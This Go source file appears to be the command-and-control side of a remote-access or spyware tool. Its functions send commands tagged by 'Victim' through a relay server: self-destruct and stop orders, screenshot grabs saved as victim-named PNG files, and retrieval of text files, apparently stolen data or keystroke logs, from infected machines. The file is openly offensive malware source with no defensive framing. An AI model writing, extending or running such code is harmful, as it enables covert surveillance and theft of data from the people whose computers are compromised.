package service

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"image/png"
	"io/ioutil"
	"main/models"
	"main/network"
	"main/repo"
	"main/utils"
	"os"
	"time"
)

func ExecuteSelfDestruct(command *models.Command, aliasRepo *repo.AliasRepo) error {
	return ExecutePostRequest(command, aliasRepo)
}

func ExecuteScreenshot(com *models.Command, aliasRepo *repo.AliasRepo) error {
	if com.Method == utils.GET {
		return ExecuteScreenshotGet(com.Body, aliasRepo)
	} else {
		return ExecutePostRequest(com, aliasRepo)
	}
}

func ExecuteAliasCommand(command *models.Command, aliasRepo *repo.AliasRepo) error {
	if command.Method == utils.GET {
		aliasRepo.PrintAll()
		return nil
	}
	if len(command.Body) != 2 {
		return errors.New("Number of body arguments is not 2")
	}
	aliasRepo.Add(command.Body[0], command.Body[1])
	return nil
}

func ExecuteScreenshotGet(body []string, aliasRepo *repo.AliasRepo) error {
	var res []byte
	resp, err := network.GetFromServer(&models.TextLog{Body: "screenshot", Log: models.Log{Date: time.Now(), Victim: aliasRepo.GetVictim(body[0])}})
	if err != nil {
		return err
	}
	json.NewDecoder(resp.Body).Decode(&res)
	img, _ := png.Decode(bytes.NewReader(res))
	out, err := os.Create(fmt.Sprintf("%s.png", aliasRepo.GetVictim(body[0])))
	defer out.Close()
	if err != nil {
		fmt.Println("Error decoding")
		return err
	}
	err = png.Encode(out, img)
	if err != nil {
		fmt.Println("Error decoding")
		return err
	}
	return nil
}

func ExecutePostRequest(com *models.Command, aliasRepo *repo.AliasRepo) error {
	_, err := network.SendTextToServer(&models.TextLog{Body: com.Command, Log: models.Log{Date: time.Now(), Victim: aliasRepo.GetVictim(com.Body[0])}})
	if err != nil {
		fmt.Println("Error sending command to server")
	}
	return err
}

func ExecuteTextFileCommand(com *models.Command, aliasRepo *repo.AliasRepo) error {
	if com.Method == utils.GET {
		return ExecuteGetFileCommand(com, aliasRepo)
	} else {
		return ExecutePostRequest(com, aliasRepo)
	}
}

func ExecuteStopCommand(com *models.Command, aliasRepo *repo.AliasRepo) error {
	return ExecutePostRequest(com, aliasRepo)
}

func ExecuteGetFileCommand(com *models.Command, aliasRepo *repo.AliasRepo) error {
	var res string
	resp, err := network.GetFromServer(&models.TextLog{Body: com.Command, Log: models.Log{Date: time.Now(), Victim: aliasRepo.GetVictim(com.Body[0])}})
	if err != nil {
		fmt.Println("Error reaching the server")
		return err
	}
	json.NewDecoder(resp.Body).Decode(&res)
	ioutil.WriteFile(fmt.Sprintf("%s-%s.txt", com.Command, aliasRepo.GetVictim(com.Body[0])), []byte(res), 0777)
	return nil
}
